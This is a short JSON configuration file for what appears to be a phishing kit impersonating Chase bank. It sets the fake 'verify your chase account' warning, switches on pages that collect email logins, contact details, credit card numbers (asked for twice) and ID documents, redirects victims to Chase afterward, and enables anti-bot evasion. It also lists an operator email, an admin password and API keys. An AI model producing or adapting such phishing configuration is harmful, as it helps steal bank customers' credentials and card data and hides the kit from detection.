{"show_page_id":"yes","installed":"yes","yourname":"corleonex","warning_button_text":"Sign in to my account","warning_text":"Please verify your chase account information immediately .","your_email":"corleonex999@gmail.com","username":"Corleonex","password":"Corleonex","redirect":"chase","double_login":"yes","double_access":"yes","corleonex_protection":"yes","redirection":"yes","double_cc":"yes","show_start_page":"yes","show_email_access":"yes","show_contact_information":"yes","show_credit_card":"yes","show_success_page":"yes","anti_bot":"yes","numverifier":"no","numverifier_api":"9f097fedcbcb15f09b6db64a0d0f9f89","Key":"yes","apikey":"123454554545","anti_bot_apikey":"","_id":5,"show_id_page":null}